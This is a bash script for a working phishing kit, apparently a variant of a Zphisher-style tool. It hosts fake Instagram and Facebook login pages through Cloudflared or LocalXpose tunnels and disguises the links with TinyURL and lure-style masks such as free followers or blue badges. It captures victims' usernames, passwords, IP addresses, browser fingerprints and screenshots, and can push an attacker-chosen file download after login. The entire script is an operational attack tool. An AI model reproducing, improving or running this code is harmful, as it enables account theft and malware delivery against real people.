__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	echo ""
}

## Small Banner
banner_small() {
	echo ""
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
	
	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}


## Ask for post-login action (for Instagram phishing)
ask_download_link() {
	echo
	echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Select Post-Login Action:"
	echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Download File (auto-download)"
	echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Redirect to URL (redirect to any website)"
	echo -e "${RED}[${WHITE}00${RED}]${ORANGE} None (skip - redirect to instagram.com)"
	echo
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select option [0/1/2]: ${BLUE}" ACTION_CHOICE
	
	case $ACTION_CHOICE in
		1|01)
			echo
			read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter download file URL: ${BLUE}" DOWNLOAD_LINK
			ACTION_TYPE="download"
			REDIRECT_URL=""
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Download link set: ${ORANGE}${DOWNLOAD_LINK}${WHITE}"
			;;
		2|02)
			echo
			read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter redirect URL: ${BLUE}" REDIRECT_URL
			ACTION_TYPE="redirect"
			DOWNLOAD_LINK=""
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Redirect URL set: ${ORANGE}${REDIRECT_URL}${WHITE}"
			;;
		*)
			DOWNLOAD_LINK=""
			REDIRECT_URL=""
			ACTION_TYPE="none"
			echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No action selected.${WHITE}"
			;;
	esac
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	
	# Create action config file for phishing page
	cat > .server/www/action_config.php <<EOF
<?php
\$action_type = '${ACTION_TYPE}';
\$download_url = '${DOWNLOAD_LINK}';
\$redirect_url = '${REDIRECT_URL}';
?>
EOF
	
	if [[ "${ACTION_TYPE}" == "download" ]]; then
		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: File download${WHITE}"
	elif [[ "${ACTION_TYPE}" == "redirect" ]]; then
		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: URL redirect to ${ORANGE}${REDIRECT_URL}${WHITE}"
	else
		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: No post-login action${WHITE}"
	fi
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Collect credentials & victim IP
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found!!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
		
		# Check for screenshots
		if [[ -d ".server/www/screenshots" ]]; then
			screenshot_count=$(ls -1 .server/www/screenshots/*.jpg 2>/dev/null | wc -l)
			if [[ $screenshot_count -gt 0 ]]; then
				echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} Screenshots Captured: ${ORANGE}$screenshot_count${WHITE}"
				# Move to auth directory
				mkdir -p auth/screenshots
				cp -r .server/www/screenshots/* auth/screenshots/ 2>/dev/null
			fi
		fi
		
		# Check for fingerprints
		if [[ -e ".server/www/fingerprints.txt" ]]; then
			echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Browser Fingerprint Captured!"
			echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/fingerprints.txt${WHITE}"
			cat .server/www/fingerprints.txt >> auth/fingerprints.txt
			rm -rf .server/www/fingerprints.txt
		fi
		
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .server/.cld.log > /dev/null 2>&1
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
	
	# Start cloudflared tunnel
	sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	
	# Attempt to get URL with retries
	attempt=0
	max_attempts=15
	
	while [ $attempt -lt $max_attempts ]; do
		sleep 2
		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
		if [ ! -z "$cldflr_url" ]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared tunnel established!"
			custom_url "$cldflr_url"
			capture_data
			return 0
		fi
		attempt=$((attempt + 1))
	done
	
	# If we get here, cloudflared failed
	echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish cloudflared tunnel"
	echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Please restart and try again${WHITE}"
	exit 1
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ -e ".server/loclx" ]]; then
		lclx_path="./.server/loclx"
	else
		lclx_path="loclx"
	fi
	
	# Start loclx tunnel
	sleep 1 && $lclx_path tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_cloudflared;;
		2 | 02)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL (DISABLED - always use default)
custom_mask() {
	# Auto-use default mask URL (skip prompt for faster setup)
	# The $mask variable is already set by each site function
	echo -ne "${RED}[${WHITE}-${RED}]${CYAN} Using default Masked URL${WHITE}\n"
}

## URL Shortner
shorten() {
	# TinyURL returns the shortened URL directly as plain text
	# Add User-Agent header as TinyURL may block requests without it
	short=$(curl --silent --insecure --retry-connrefused --retry 2 --retry-delay 2 \
		-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
		"$1" 2>&1)
	
	# Check if the response is a valid TinyURL
	if [[ ! -z "$short" && "$short" == http*"tinyurl.com"* && ! "$short" == *"Error"* && ! "$short" == *"error"* ]]; then
		processed_url="$short"
		return 0
	else
		return 1
	fi
}

custom_url() {
	url=${1#http*//}
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		# Primary URL (direct cloudflared/loclx link)
		url="https://$url"
		
		# Try to shorten with TinyURL (silently, as it's optional)
		if shorten "$tinyurl$url"; then
			# Successfully shortened - show success message
			echo -e "${CYAN}[${WHITE}✓${CYAN}]${GREEN} TinyURL shortened successfully${WHITE}"
			masked_url="$mask@${processed_url#http*//}"
		else
			# TinyURL failed - just skip it silently since direct link works
			processed_url=""
			masked_url=""
		fi
	else
		# Invalid URL pattern
		url="Unable to generate links. Try after turning on hotspot"
		processed_url=""
		masked_url=""
	fi

	# Display URLs
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 (Direct Cloudflared): ${GREEN}$url"
	
	if [[ ! -z "$processed_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 (TinyURL): ${ORANGE}$processed_url"
	fi
	
	if [[ ! -z "$masked_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 (Masked): ${ORANGE}$masked_url"
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			ask_download_link
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			ask_download_link
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			ask_download_link
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			ask_download_link
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Menu (Instagram Only - Auto-selected)
main_menu() {
	clear
	
	# Set website and mask for Instagram traditional page
	website="instagram"
	mask='https://get-unlimited-followers-for-instagram'
	
	# Ask for download link and proceed to tunnel menu
	ask_download_link
	tunnel_menu
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
